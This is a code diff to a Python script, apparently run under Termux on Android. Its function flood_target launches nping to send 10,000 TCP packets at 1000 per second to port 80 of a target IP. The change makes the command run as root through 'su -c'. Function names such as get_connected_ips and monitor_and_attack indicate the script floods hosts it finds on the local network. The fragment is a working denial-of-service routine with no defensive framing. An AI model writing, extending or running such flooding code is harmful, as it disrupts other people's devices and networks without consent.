@@ -9,7 +9,10 @@ def get_connected_ips():
 
 def flood_target(ip):
     print(f"Starting flood on {ip}")
-    subprocess.Popen(['nping', '--tcp', '-p', '80', '--rate', '1000', '-c', '10000', ip])
+    subprocess.Popen([
+        'su', '-c',
+        f'/data/data/com.termux/files/usr/bin/nping --tcp -p 80 --rate 1000 -c 10000 {ip}'
+    ])
 
 
 def monitor_and_attack():
